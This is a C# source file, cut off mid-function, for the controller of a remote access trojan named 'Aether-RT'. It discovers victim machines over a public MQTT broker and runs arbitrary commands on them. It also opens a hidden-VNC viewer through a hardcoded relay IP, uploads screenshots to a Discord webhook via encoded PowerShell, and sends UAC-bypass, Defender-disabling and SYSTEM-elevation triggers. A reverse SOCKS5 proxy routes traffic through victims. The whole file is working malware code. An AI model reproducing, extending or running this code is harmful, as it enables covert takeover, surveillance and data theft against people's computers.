using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.Globalization;
using System.Net.Sockets;
using System.Net;
using System.Net.WebSockets;
using MQTTnet;
using MQTTnet.Client;

class MachineInfo {
    public string Name { get; set; }
    public string OS { get; set; }
    public string IP { get; set; }
    public DateTime LastSeen { get; set; }
    public bool IsElevated { get; set; }
}

class StatsWindow : Form {
    private List<float> cpuHistory = new List<float>();
    private List<float> ramHistory = new List<float>();
    private List<float> gpuHistory = new List<float>();
    private List<float> uploadHistory = new List<float>();
    private List<float> downloadHistory = new List<float>();
    private System.Windows.Forms.Timer refreshTimer = new System.Windows.Forms.Timer();
    public StatsWindow(string target) {
        this.Text = $"Live Stats: {target}"; this.Size = new Size(400, 530);
        this.FormBorderStyle = FormBorderStyle.FixedToolWindow; this.TopMost = true; this.BackColor = Color.Black; this.DoubleBuffered = true;
        this.Paint += (s, e) => DrawGraphs(e.Graphics);
        refreshTimer.Interval = 500; refreshTimer.Tick += (s, e) => this.Invalidate(); refreshTimer.Start();
    }
    public void UpdateData(float c, float r, float g, float up, float down) {
        if (this.IsDisposed) return;
        if (this.InvokeRequired) { this.BeginInvoke(new Action(() => UpdateData(c, r, g, up, down))); return; }
        cpuHistory.Add(c); if (cpuHistory.Count > 50) cpuHistory.RemoveAt(0);
        ramHistory.Add(r); if (ramHistory.Count > 50) ramHistory.RemoveAt(0);
        gpuHistory.Add(g); if (gpuHistory.Count > 50) gpuHistory.RemoveAt(0);
        uploadHistory.Add(up); if (uploadHistory.Count > 50) uploadHistory.RemoveAt(0);
        downloadHistory.Add(down); if (downloadHistory.Count > 50) downloadHistory.RemoveAt(0);
    }
    private void DrawGraphs(Graphics g) {
        g.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.AntiAlias;
        DrawGraph(g, "CPU Usage", cpuHistory, Color.Lime, 30, "%");
        DrawGraph(g, "RAM Usage", ramHistory, Color.Cyan, 130, "%");
        DrawGraph(g, "GPU/Other", gpuHistory, Color.Yellow, 230, "%");
        DrawGraph(g, "Upload", uploadHistory, Color.Blue, 330, " KB/s");
        DrawGraph(g, "Download", downloadHistory, Color.Lime, 430, " KB/s");
    }
    private void DrawGraph(Graphics g, string label, List<float> data, Color color, int y, string unit) {
        float val = (data.Count > 0) ? data.Last() : 0;
        g.DrawString($"{label}: {val:F1}{unit}", SystemFonts.DefaultFont, new SolidBrush(color), 10, y - 18);
        g.DrawRectangle(new Pen(Color.DimGray), 10, y, 360, 70);
        if (data.Count < 2) return;
        PointF[] pts = new PointF[data.Count];
        float max = (unit == "%") ? 100 : Math.Max(data.Max(), 10);
        for (int i = 0; i < data.Count; i++) pts[i] = new PointF(10 + (i * 7.2f), y + 70 - (Math.Min(data[i], max) / max * 70));
        g.DrawLines(new Pen(color, 2), pts);
    }
}

class VncViewer : Form {
    private string target;
    private IMqttClient client;
    private string secret;
    public PictureBox pic = new PictureBox();
    private Panel kbPanel = new Panel();
    private ClientWebSocket? wsClient;
    private string RELAY_SERVER = "ws://51.83.6.5:20113";

    public VncViewer(string t, string s, IMqttClient c) {
        target = t; secret = s; client = c;
        this.Text = "Aether-RT hVNC PRO Viewer (Direct UDP) - " + t;
        this.ClientSize = new Size(1280, 1024); // Set client area to exactly 1280x1024
        this.BackColor = Color.Black;
        this.StartPosition = FormStartPosition.CenterScreen;
        this.FormBorderStyle = FormBorderStyle.FixedSingle; // Prevent resize
        this.MaximizeBox = false; // Disable maximize

        pic.Size = new Size(1280, 720);
        pic.Location = new Point(0, 0);
        pic.SizeMode = PictureBoxSizeMode.Zoom; // Better scaling
        pic.BackColor = Color.Black; // Changed to pure black
        this.Controls.Add(pic);

        kbPanel.Location = new Point(0, 720);
        kbPanel.Size = new Size(1280, 304); // Increased height for full keyboard
        kbPanel.BackColor = Color.FromArgb(15, 15, 15);
        this.Controls.Add(kbPanel);

        CreateKeyboard();

        // Mouse events with proper coordinate scaling
        pic.MouseDown += (s, e) => {
            // Scale coordinates from PictureBox to actual screen resolution
            float scaleX = 1280f / pic.Image?.Width ?? 1280f;
            float scaleY = 720f / pic.Image?.Height ?? 720f;
            int actualX = (int)(e.X / scaleX);
            int actualY = (int)(e.Y / scaleY);
            SendVncInput("MOUSE", actualX, actualY, GetMouseFlags(e.Button, true));
        };
        
        pic.MouseUp += (s, e) => {
            float scaleX = 1280f / pic.Image?.Width ?? 1280f;
            float scaleY = 720f / pic.Image?.Height ?? 720f;
            int actualX = (int)(e.X / scaleX);
            int actualY = (int)(e.Y / scaleY);
            SendVncInput("MOUSE", actualX, actualY, GetMouseFlags(e.Button, false));
        };
        
        pic.MouseMove += (s, e) => {
            if (e.Button != MouseButtons.None) {
                float scaleX = 1280f / (pic.Image?.Width ?? 1280f);
                float scaleY = 720f / (pic.Image?.Height ?? 720f);
                int actualX = (int)(e.X / scaleX);
                int actualY = (int)(e.Y / scaleY);
                SendVncInput("MOUSE", actualX, actualY, 0x0001);
            }
        };

        StartWebSocketListener();
    }

    private void StartWebSocketListener() {
        Task.Run(async () => {
            try {
                wsClient = new ClientWebSocket();
                await wsClient.ConnectAsync(new Uri(RELAY_SERVER), CancellationToken.None);
                
                // Send init message
                string controllerId = Guid.NewGuid().ToString();
                string initMsg = $"{{\"id\":\"{controllerId}\",\"role\":\"controller\"}}";
                await wsClient.SendAsync(
                    Encoding.UTF8.GetBytes(initMsg),
                    WebSocketMessageType.Text,
                    true,
                    CancellationToken.None
                );
                
                // Send connect request
                await Task.Delay(500);
                byte[] connectMsg = new byte[37];
                connectMsg[0] = 0x01; // CONNECT type
                Encoding.UTF8.GetBytes(target.PadRight(36)).CopyTo(connectMsg, 1);
                await wsClient.SendAsync(
                    new ArraySegment<byte>(connectMsg),
                    WebSocketMessageType.Binary,
                    true,
                    CancellationToken.None
                );
                
                Console.WriteLine($"[+] WebSocket connected to relay");

                var buffer = new byte[10 * 1024 * 1024]; // 10MB buffer
                while (!this.IsDisposed && wsClient.State == WebSocketState.Open) {
                    var result = await wsClient.ReceiveAsync(new ArraySegment<byte>(buffer), CancellationToken.None);
                    
                    if (result.MessageType == WebSocketMessageType.Binary) {
                        // Frame data: [FRAME_ID(4)][JPEG_DATA]
                        if (result.Count > 4) {
                            int frameId = BitConverter.ToInt32(buffer, 0);
                            byte[] imgData = new byte[result.Count - 4];
                            Array.Copy(buffer, 4, imgData, 0, imgData.Length);
                            
                            using (MemoryStream ms = new MemoryStream(imgData)) {
                                try {
                                    var img = Image.FromStream(ms);
                                    pic.BeginInvoke(new Action(() => {
                                        var oldImg = pic.Image;
                                        pic.Image = img;
                                        oldImg?.Dispose();
                                    }));
                                } catch { }
                            }
                        }
                    }
                }
            } catch (Exception ex) { 
                Console.WriteLine("[!] WebSocket Error: " + ex.Message); 
            }
        });
    }

    private void CreateKeyboard() {
        // Row 1: Function keys + extras
        int x = 5, y = 10;
        string[] row1 = { "ESC", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "F11", "F12", "PRTSC", "SCRLK", "PAUSE" };
        foreach (var k in row1) {
            AddKey(k, x, y, k == "ESC" ? 50 : 45, 30);
            x += k == "ESC" ? 60 : 50;
        }

        // Row 2: Numbers + Backspace
        x = 5; y = 50;
        string[] row2 = { "`", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "BKSP" };
        foreach (var k in row2) {
            AddKey(k, x, y, k == "BKSP" ? 80 : 45, 30);
            x += k == "BKSP" ? 85 : 50;
        }

        // Row 3: QWERTY + Backslash
        x = 5; y = 90;
        AddKey("TAB", x, y, 70, 30); x += 75;
        string[] row3 = { "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "[", "]", "\\" };
        foreach (var k in row3) {
            AddKey(k, x, y, 45, 30);
            x += 50;
        }

        // Row 4: ASDF + Enter
        x = 5; y = 130;
        AddKey("CAPS", x, y, 80, 30); x += 85;
        string[] row4 = { "A", "S", "D", "F", "G", "H", "J", "K", "L", ";", "'" };
        foreach (var k in row4) {
            AddKey(k, x, y, 45, 30);
            x += 50;
        }
        AddKey("ENT", x, y, 70, 30);

        // Row 5: ZXCV + Shift
        x = 5; y = 170;
        AddKey("SHIFT", x, y, 100, 30); x += 105;
        string[] row5 = { "Z", "X", "C", "V", "B", "N", "M", ",", ".", "/" };
        foreach (var k in row5) {
            AddKey(k, x, y, 45, 30);
            x += 50;
        }
        AddKey("SHIFT", x, y, 100, 30);

        // Row 6: Bottom row
        x = 5; y = 210;
        AddKey("CTRL", x, y, 70, 30); x += 75;
        AddKey("WIN", x, y, 60, 30); x += 65;
        AddKey("ALT", x, y, 60, 30); x += 65;
        AddKey("SPACE", x, y, 350, 30); x += 355;
        AddKey("ALT", x, y, 60, 30); x += 65;
        AddKey("WIN", x, y, 60, 30); x += 65;
        AddKey("MENU", x, y, 60, 30); x += 65;
        AddKey("CTRL", x, y, 70, 30);

        // Navigation cluster (top right)
        x = 1000; y = 50;
        AddKey("INS", x, y, 60, 30); x += 65;
        AddKey("HOME", x, y, 60, 30); x += 65;
        AddKey("PGUP", x, y, 60, 30);
        
        x = 1000; y = 90;
        AddKey("DEL", x, y, 60, 30); x += 65;
        AddKey("END", x, y, 60, 30); x += 65;
        AddKey("PGDN", x, y, 60, 30);

        // Arrow keys (bottom right)
        x = 1065; y = 170;
        AddKey("UP", x, y, 50, 30);
        
        x = 1010; y = 210;
        AddKey("LEFT", x, y, 50, 30); x += 55;
        AddKey("DOWN", x, y, 50, 30); x += 55;
        AddKey("RIGHT", x, y, 50, 30);
    }

    private void AddKey(string k, int x, int y, int w, int h) {
        Button btn = new Button {
            Text = k,
            Location = new Point(x, y),
            Width = w,
            Height = h,
            ForeColor = Color.Cyan,
            BackColor = Color.FromArgb(30, 30, 30),
            FlatStyle = FlatStyle.Flat,
            Font = new Font("Consolas", 8, FontStyle.Bold)
        };
        btn.FlatAppearance.BorderColor = Color.Cyan;
        btn.FlatAppearance.BorderSize = 1;
        btn.Click += async (s, e) => await SendKey(k, btn);
        kbPanel.Controls.Add(btn);
    }

    private async Task SendKey(string k, Button btn) {
        btn.BackColor = Color.Orange;
        btn.ForeColor = Color.Black;
        
        byte vk = GetVk(k);
        if (vk != 0 && wsClient?.State == WebSocketState.Open) {
            // Send via WebSocket: [TYPE(1)][TARGET_ID(36)][INPUT_TYPE(1)][VK(1)][FLAGS(1)]
            byte[] packet = new byte[40];
            packet[0] = 0x03; // CONTROL type
            Encoding.UTF8.GetBytes(target.PadRight(36)).CopyTo(packet, 1);
            packet[37] = 0x01; // KEY input
            packet[38] = vk;
            packet[39] = 0x00; // Key down
            
            await wsClient.SendAsync(
                new ArraySegment<byte>(packet),
                WebSocketMessageType.Binary,
                true,
                CancellationToken.None
            );
            
            await Task.Delay(50);
            
            // Key up
            packet[39] = 0x02;
            await wsClient.SendAsync(
                new ArraySegment<byte>(packet),
                WebSocketMessageType.Binary,
                true,
                CancellationToken.None
            );
        }

        await Task.Delay(100);
        btn.BackColor = Color.FromArgb(30, 30, 30);
        btn.ForeColor = Color.Cyan;
    }

    private byte GetVk(string k) {
        // Special keys
        if (k == "BKSP") return 0x08;
        if (k == "TAB") return 0x09;
        if (k == "ENT") return 0x0D;
        if (k == "SHIFT") return 0x10;
        if (k == "CTRL") return 0x11;
        if (k == "ALT") return 0x12;
        if (k == "PAUSE") return 0x13;
        if (k == "CAPS") return 0x14;
        if (k == "ESC") return 0x1B;
        if (k == "SPACE") return 0x20;
        
        // Navigation
        if (k == "PGUP") return 0x21;
        if (k == "PGDN") return 0x22;
        if (k == "END") return 0x23;
        if (k == "HOME") return 0x24;
        if (k == "LEFT") return 0x25;
        if (k == "UP") return 0x26;
        if (k == "RIGHT") return 0x27;
        if (k == "DOWN") return 0x28;
        
        // Edit keys
        if (k == "PRTSC") return 0x2C;
        if (k == "INS") return 0x2D;
        if (k == "DEL") return 0x2E;
        
        // Windows keys
        if (k == "WIN") return 0x5B;
        if (k == "MENU") return 0x5D;
        
        // Function keys
        if (k == "F1") return 0x70;
        if (k == "F2") return 0x71;
        if (k == "F3") return 0x72;
        if (k == "F4") return 0x73;
        if (k == "F5") return 0x74;
        if (k == "F6") return 0x75;
        if (k == "F7") return 0x76;
        if (k == "F8") return 0x77;
        if (k == "F9") return 0x78;
        if (k == "F10") return 0x79;
        if (k == "F11") return 0x7A;
        if (k == "F12") return 0x7B;
        
        // Scroll Lock
        if (k == "SCRLK") return 0x91;
        
        // Single character keys
        if (k.Length == 1) {
            char c = k[0];
            // Letters
            if (c >= 'A' && c <= 'Z') return (byte)c;
            // Numbers
            if (c >= '0' && c <= '9') return (byte)c;
            // Symbols
            if (c == '`') return 0xC0;
            if (c == '-') return 0xBD;
            if (c == '=') return 0xBB;
            if (c == '[') return 0xDB;
            if (c == ']') return 0xDD;
            if (c == '\\') return 0xDC;
            if (c == ';') return 0xBA;
            if (c == '\'') return 0xDE;
            if (c == ',') return 0xBC;
            if (c == '.') return 0xBE;
            if (c == '/') return 0xBF;
        }
        
        return 0;
    }

    private uint GetMouseFlags(MouseButtons b, bool down) {
        if (b == MouseButtons.Left) return down ? 0x0002u : 0x0004u;
        if (b == MouseButtons.Right) return down ? 0x0008u : 0x0010u;
        return 0;
    }

    private void SendVncInput(string type, int x, int y, uint flags) {
        if (wsClient?.State == WebSocketState.Open) {
            Task.Run(async () => {
                // Send via WebSocket: [TYPE(1)][TARGET_ID(36)][INPUT_TYPE(1)][X(4)][Y(4)][FLAGS(4)]
                byte[] packet = new byte[50];
                packet[0] = 0x03; // CONTROL type
                Encoding.UTF8.GetBytes(target.PadRight(36)).CopyTo(packet, 1);
                packet[37] = 0x02; // MOUSE input
                BitConverter.GetBytes(x).CopyTo(packet, 38);
                BitConverter.GetBytes(y).CopyTo(packet, 42);
                BitConverter.GetBytes(flags).CopyTo(packet, 46);
                
                await wsClient.SendAsync(
                    new ArraySegment<byte>(packet),
                    WebSocketMessageType.Binary,
                    true,
                    CancellationToken.None
                );
            });
        }
    }
}

class Controller
{
    static string secretId = "anonymous_remote_shell_9921";
    static ConcurrentDictionary<string, MachineInfo> activeMachines = new ConcurrentDictionary<string, MachineInfo>();
    static string selectedMachine = "";
    static StatsWindow currentStatsWindow = null;
    static VncViewer currentVncViewer = null;
    static ConcurrentDictionary<string, StringBuilder> frameBuffers = new ConcurrentDictionary<string, StringBuilder>();
    static bool pollingStats = false;
    static long lastSentBytes = 0;
    static long lastReceivedBytes = 0;
    static string savedWebhook = "";
    static ConcurrentDictionary<string, TcpClient> proxySessions = new ConcurrentDictionary<string, TcpClient>();
    static TcpListener proxyServer = null;

    static async Task Main(string[] args)
    {
        Console.OutputEncoding = Encoding.UTF8;
        PrintHeader();
        Console.WriteLine("[*] Initializing Aether-RT v6.4...");
        var mqttFactory = new MqttFactory();
        using (var mqttClient = mqttFactory.CreateMqttClient())
        {
            var options = new MqttClientOptionsBuilder().WithTcpServer("broker.hivemq.com").Build();
            Console.WriteLine("[*] Connecting to public broker (HiveMQ)...");
            
            mqttClient.ApplicationMessageReceivedAsync += e => {
                string t = e.ApplicationMessage.Topic;
                string p = Encoding.UTF8.GetString(e.ApplicationMessage.PayloadSegment).Trim();
                if (t.EndsWith("/discovery")) {
                    string[] s = p.Split('|');
                    if (s.Length >= 3) {
                        bool elev = s.Length >= 4 && s[3].Equals("True", StringComparison.OrdinalIgnoreCase);
                        activeMachines[s[0]] = new MachineInfo { Name = s[0], OS = s[1], IP = s[2], LastSeen = DateTime.Now, IsElevated = elev };
                    }
                }
                // VNC image chunks no longer used for MQTT (using tunnel stream instead)
                else if (t.Contains("/proxy/res")) {
                    try {
                        string[] s = p.Split(new[] { '|' }, 3);
                        if (s.Length >= 2) {
                            string connId = s[0];
                            string type = s[1];
                            if (type == "DATA") {
                                if (proxySessions.TryGetValue(connId, out var client)) {
                                    byte[] data = Convert.FromBase64String(s[2]);
                                    client.GetStream().Write(data, 0, data.Length);
                                }
                            }
                            else if (type == "CLOSE") {
                                if (proxySessions.TryRemove(connId, out var client)) client.Close();
                            }
                        }
                    } catch { }
                }
                else if (t.Contains("/res")) {
                    if (p.Contains("STATS:")) {
                        try {
                            string statsLine = p.Split('\n', '\r').FirstOrDefault(l => l.Contains("STATS:"));
                            if (statsLine != null) {
                                string[] s = statsLine.Trim().Substring(6).Split('|');
                                if (s.Length >= 5) {
                                    float cpu = float.Parse(s[0].Trim(), CultureInfo.InvariantCulture); 
                                    float ram = float.Parse(s[1].Trim(), CultureInfo.InvariantCulture);
                                    long recvBytes = long.Parse(s[3].Trim());
                                    long sentBytes = long.Parse(s[4].Trim());
                                    float downloadSpeed = 0;
                                    float uploadSpeed = 0;
                                    if (lastReceivedBytes > 0) downloadSpeed = Math.Max(0, (recvBytes - lastReceivedBytes) / 1024f / 5f);
                                    if (lastSentBytes > 0) uploadSpeed = Math.Max(0, (sentBytes - lastSentBytes) / 1024f / 5f);
                                    lastReceivedBytes = recvBytes;
                                    lastSentBytes = sentBytes;
                                    currentStatsWindow?.UpdateData(cpu, ram, 0, uploadSpeed, downloadSpeed);
                                }
                            }
                        } catch { }
                    } else if (!string.IsNullOrWhiteSpace(p)) {
                        Console.ForegroundColor = ConsoleColor.Cyan; Console.WriteLine($"\n[OUTPUT]:\n{p}"); Console.ResetColor();
                        WritePrompt();
                    }
                }
                return Task.CompletedTask;
            };
            
            try {
                await mqttClient.ConnectAsync(options);
                Console.WriteLine("[+] Connected successfully! Waiting for targets...");
            } catch (Exception ex) {
                Console.WriteLine($"[!] Connection Failed: {ex.Message}");
                Console.WriteLine("Press any key to retry...");
                Console.ReadKey();
                return;
            }

            await mqttClient.SubscribeAsync($"{secretId}/discovery");
            await mqttClient.SubscribeAsync($"{secretId}/+/res");
            await mqttClient.SubscribeAsync($"{secretId}/+/vnc/img_part");
            await mqttClient.SubscribeAsync($"{secretId}/+/proxy/res");
            while (true) {
                WritePrompt();
                string input = Console.ReadLine();
                if (string.IsNullOrEmpty(input)) continue;
                if (input.StartsWith("/")) { await HandleCmd(input, mqttClient); continue; }
                if (input.ToLower() == "mls") { ShowSelectionMenu(); continue; }
                if (string.IsNullOrEmpty(selectedMachine)) { Console.WriteLine("Select target."); continue; }
                await Send(input, mqttClient);
            }
        }
    }

    static async Task HandleCmd(string cmd, IMqttClient c) {
        switch (cmd.ToLower()) {
            case "/help":
                ShowHelp();
                break;
            case "/stats":
                if (string.IsNullOrEmpty(selectedMachine)) return;
                if (currentStatsWindow == null || currentStatsWindow.IsDisposed) {
                    ManualResetEvent ready = new ManualResetEvent(false);
                    Thread t = new Thread(() => { 
                        Application.EnableVisualStyles(); 
                        var win = new StatsWindow(selectedMachine);
                        currentStatsWindow = win;
                        ready.Set();
                        Application.Run(win); 
                    });
                    t.SetApartmentState(ApartmentState.STA); t.Start();
                    ready.WaitOne(2000); // Ensure window is created before polling
                    StartPolling(c);
                }
                break;
            case "/screenshot":
                if (string.IsNullOrEmpty(savedWebhook)) { Console.Write("Enter Discord Webhook: "); savedWebhook = Console.ReadLine(); }
                if (string.IsNullOrEmpty(savedWebhook)) break;
                string ssScript = "Add-Type -AssemblyName System.Drawing,System.Windows.Forms; " +
                                  "$s = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; " +
                                  "$b = New-Object Drawing.Bitmap($s.Width, $s.Height); " +
                                  "$g = [Drawing.Graphics]::FromImage($b); " +
                                  "$g.CopyFromScreen(0,0,0,0,$b.Size); " +
                                  "$f = [IO.Path]::Combine([IO.Path]::GetTempPath(), 's.png'); " +
                                  "$b.Save($f, [Drawing.Imaging.ImageFormat]::Png); " +
                                  "$b.Dispose(); $g.Dispose(); " +
                                  "curl.exe --silent -F \"file=@$f\" " + savedWebhook + " > $null; " +
                                  "Remove-Item $f -ErrorAction SilentlyContinue";
                await SendEncoded(ssScript, c);
                break;
            case "/info": await Send("systeminfo", c); break;
            case "/list": await Send("tasklist", c); break;
            case "/clear": PrintHeader(); break;
            case "/exit": Environment.Exit(0); break;
            case "/uacbypass":
                if (string.IsNullOrEmpty(selectedMachine)) return;
                await Send("/uac-internal-trigger", c);
                Console.WriteLine("Sent stealth UAC Bypass trigger.");
                break;
            case "/freeze":
                if (string.IsNullOrEmpty(selectedMachine)) return;
                await Send("/freeze-av", c);
                Console.WriteLine("Sent Defender Freeze trigger (UnDefend method).");
                break;
            case "/getsystem":
                if (string.IsNullOrEmpty(selectedMachine)) return;
                await Send("/getsystem", c);
                Console.WriteLine("Sent SYSTEM Elevation trigger (RedSun method).");
                break;
            case "/proxy":
                if (string.IsNullOrEmpty(selectedMachine)) return;
                StartReverseProxy(1080, c);
                Console.WriteLine("[+] Reverse SOCKS5 Proxy started on 127.0.0.1:1080");
                Console.WriteLine("[!] Configure your browser to use SOCKS5 at 127.0.0.1:1080");
                break;
            case "/hvnc":
                if (string.IsNullOrEmpty(selectedMachine)) return;
                
                // Auto-start proxy for the tunnel if not running
                StartReverseProxy(1080, c);
                
                await Send("/hvnc", c);
                Console.WriteLine("[+] Sent hVNC v9.5 PRO trigger. Opening High-Speed Viewer...");
                Thread tVnc = new Thread(() => { 
                    Application.EnableVisualStyles(); 
                    var win = new VncViewer(selectedMachine, secretId, c);
                    currentVncViewer = win;
                    Application.Run(win); 
                });
                tVnc.SetApartmentState(ApartmentState.STA); tVnc.Start();
                break;
        }
    }

    static void StartReverseProxy(int port, IMqttClient mqttClient) {
        if (proxyServer != null) return;
        proxyServer = new TcpListener(IPAddress.Loopback, port);
        proxyServer.Start();
        Task.Run(async () => {
            while (true) {
                try {
                    TcpClient client = await proxyServer.AcceptTcpClientAsync();
                    string connId = Guid.NewGuid().ToString().Substring(0, 5);
                    proxySessions[connId] = client;
                    _ = Task.Run(() => HandleProxySession(connId, client, mqttClient));
                } catch { }
            }
        });
    }

    static async Task HandleProxySession(string connId, TcpClient client, IMqttClient mqttClient) {
        var stream = client.GetStream();
        byte[] buffer = new byte[30000];
        try {
            // SOCKS5 Handshake (Simple)
            int read = await stream.ReadAsync(buffer, 0, buffer.Length);
            if (buffer[0] != 0x05) return;
            await stream.WriteAsync(new byte[] { 0x05, 0x00 }, 0, 2);

            read = await stream.ReadAsync(buffer, 0, buffer.Length);
            // v9.0 Simple SOCKS5 Connect
            string host = ""; int port = 0;
            if (buffer[3] == 0x01) { // IPv4
                host = $"{buffer[4]}.{buffer[5]}.{buffer[6]}.{buffer[7]}";
                port = (buffer[8] << 8) + buffer[9];
            } else if (buffer[3] == 0x03) { // Domain
                int len = buffer[4];
                host = Encoding.UTF8.GetString(buffer, 5, len);
                port = (buffer[5 + len] << 8) + buffer[5 + len + 1];
            }

            // Tell executor to connect
            await mqttClient.PublishAsync(new MqttApplicationMessageBuilder()
                .WithTopic($"{secretId}/{selectedMachine}/proxy/cmd")
                .WithPayload($"{connId}|CONNECT|{host}|{port}")
                .Build());
            
            await stream.WriteAsync(new byte[] { 0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0 }, 0, 10);

            while (client.Connected) {
                read = await stream.ReadAsync(buffer, 0, buffer.Length);
                if (read <= 0) break;
                string b64 = Convert.ToBase64String(buffer, 0, read);
                await mqttClient.PublishAsync(new MqttApplicationMessageBuilder()
                    .WithTopic($"{secretId}/{selectedMachine}/proxy/cmd")
                    .WithPayload($"{connId}|DATA|{b64}|0")
                    .Build());
            }
        } catch { } finally {
            proxySessions.TryRemove(connId, out _);
            await mqttClient.PublishAsync(new MqttApplicationMessageBuilder()
                .WithTopic($"{secretId}/{selectedMachine}/proxy/cmd")
                .WithPayload($"{connId}|CLOSE||0")
                .Build());
        }
    }

    static void StartPolling(IMqttClient c) {
        if (pollingStats) return; pollingStats = true;
        Task.Run(async () => {
            string pollScript = "$p = (Get-WmiObject Win32_Processor | Measure-Object LoadPercentage -Average).Average; " +
                               "$m = Get-WmiObject Win32_OperatingSystem; " +
                               "$u = ($m.TotalVisibleMemorySize - $m.FreePhysicalMemory) / $m.TotalVisibleMemorySize * 100; " +
                               "$n = (Get-NetAdapterStatistics | Measure-Object ReceivedBytes -Sum).Sum; " +
                               "$s = (Get-NetAdapterStatistics | Measure-Object SentBytes -Sum).Sum; " +
                               "\"STATS:$([math]::Round($p,1))|$([math]::Round($u,1))|0|$n|$s\" -replace ',', '.'";
            while (currentStatsWindow != null && !currentStatsWindow.IsDisposed) {
                await SendEncoded(pollScript, c);
                await Task.Delay(5000);
            }
            pollingStats = false;
        });
    }

    static async Task SendEncoded(string script, IMqttClient c) {
        string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));
        await Send("powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand " + b64, c);
    }

    static async Task Send(string m, IMqttClient c) => await c.PublishAsync(new MqttApplicationMessageBuilder().WithTopic($"{secretId}/{selectedMachine}/cmd").WithPayload(m).Build());
    
    static void PrintHeader() { 
        Console.Clear(); 
        Console.ForegroundColor = ConsoleColor.Blue;
        Console.WriteLine(@"
    ╔═══════════════════════════════════════════════════════╗
    ║                                                       ║
    ║   ░█████╗░███████╗████████╗██╗  ██╗███████╗██████╗    ║
    ║   ██╔══██╗██╔════╝╚══██╔══╝██║  ██║██╔════╝██╔══██╗   ║
    ║   ███████║█████╗     ██║   ███████║█████╗  ██████╔╝   ║
    ║   ██╔══██║██╔══╝     ██║   ██╔══██║██╔══╝  ██╔══██╗   ║
    ║   ██║  ██║███████╗   ██║   ██║  ██║███████╗██║  ██║   ║
    ║   ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ║
    ║                          - RT                         ║
    ║   Advanced Remote Terminal Control System             ║
    ║                                                       ║
    ╚═══════════════════════════════════════════════════════╝
");
        Console.ResetColor();
        Console.WriteLine();
    }
    
    static void ShowHelp() {
        Console.ForegroundColor = ConsoleColor.Blue;
        Console.WriteLine("\n┌─────────────────────────────────────────────────────┐");
        Console.WriteLine("│              AETHER-RT COMMAND REFERENCE              │");
        Console.WriteLine("└─────────────────────────────────────────────────────┘");
        Console.ResetColor();
        
        Console.ForegroundColor = ConsoleColor.Cyan;
        Console.WriteLine("\n► GENERAL COMMANDS:");
        Console.ResetColor();
        Console.WriteLine("  mls                    - List available machines");
        Console.WriteLine("  /help                  - Display this help menu");
        Console.WriteLine("  /clear                 - Clear the screen");
        Console.WriteLine("  /exit                  - Exit the application");
        
        Console.ForegroundColor = ConsoleColor.Cyan;
        Console.WriteLine("\n► MACHINE INFORMATION:");
        Console.ResetColor();
        Console.WriteLine("  /info                  - Get system information");
        Console.WriteLine("  /list                  - Get running processes");
        Console.WriteLine("  /stats                 - Display live statistics (CPU, RAM, Network)");
        Console.WriteLine("  /uacbypass             - Attempt to bypass UAC on the target machine (use with caution!)");
        
        Console.ForegroundColor = ConsoleColor.Cyan;
        Console.WriteLine("\n► REMOTE OPERATIONS:");
        Console.ResetColor();
        Console.WriteLine("  /screenshot            - Capture and upload screenshot to Discord");
        
        Console.ForegroundColor = ConsoleColor.Cyan;
        Console.WriteLine("\n► STANDARD COMMANDS:");
        Console.ResetColor();
        Console.WriteLine("  Any other command will be executed on the target machine\n");
        
        Console.ForegroundColor = ConsoleColor.Blue;
        Console.WriteLine("═══════════════════════════════════════════════════────═\n");
        Console.ResetColor();
    }
    
    static void WritePrompt() { 
        Console.ForegroundColor = ConsoleColor.Blue;
        Console.Write($"[aether-rt");
        Console.ForegroundColor = ConsoleColor.Cyan;
        Console.Write($"@{(string.IsNullOrEmpty(selectedMachine) ? "DISCONNECTED" : selectedMachine)}");
        if (!string.IsNullOrEmpty(selectedMachine) && activeMachines.TryGetValue(selectedMachine, out var machine) && machine.IsElevated) {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write(" ROOT");
        }
        Console.ForegroundColor = ConsoleColor.Blue;
        Console.Write("]$ ");
        Console.ResetColor();
    }
    
    static void ShowSelectionMenu() {
        var list = activeMachines.Values.Where(x => (DateTime.Now - x.LastSeen).TotalSeconds < 15).ToList();
        if (!list.Any()) { 
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("✗ No available machines found");
            Console.ResetColor();
            return; 
        }
        int i=0; 
        while(true) {
            Console.Clear(); 
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.WriteLine("╔════════════════════════════════════════╗");
            Console.WriteLine("║     SELECT TARGET MACHINE              ║");
            Console.WriteLine("╠════════════════════════════════════════╣");
            Console.ResetColor();
            for(int k=0; k<list.Count; k++){ 
                if(k==i){ 
                    Console.ForegroundColor=ConsoleColor.Blue;
                    Console.BackgroundColor=ConsoleColor.White; 
                    Console.ForegroundColor=ConsoleColor.Black;
                    Console.WriteLine($"║ ► {list[k].Name.PadRight(34)} ║"); 
                    Console.ResetColor();
                } else {
                    Console.ForegroundColor = ConsoleColor.Gray;
                    Console.WriteLine($"║   {list[k].Name.PadRight(34)} ║");
                    Console.ResetColor();
                }
            }
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.WriteLine("╠════════════════════════════════════════╣");
            Console.WriteLine("║ ↑/↓ Navigate | Enter Select | Esc Exit ║");
            Console.WriteLine("╚════════════════════════════════════════╝");
            Console.ResetColor();
            var key = Console.ReadKey(true).Key; 
            if(key==ConsoleKey.UpArrow && i>0) i--; 
            else if(key==ConsoleKey.DownArrow && i<list.Count-1) i++; 
            else if(key==ConsoleKey.Enter){ 
                selectedMachine=list[i].Name; 
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"\n✓ Connected to: {selectedMachine}\n");
                Console.ResetColor();
                PrintHeader(); 
                break; 
            } else if(key==ConsoleKey.Escape) {
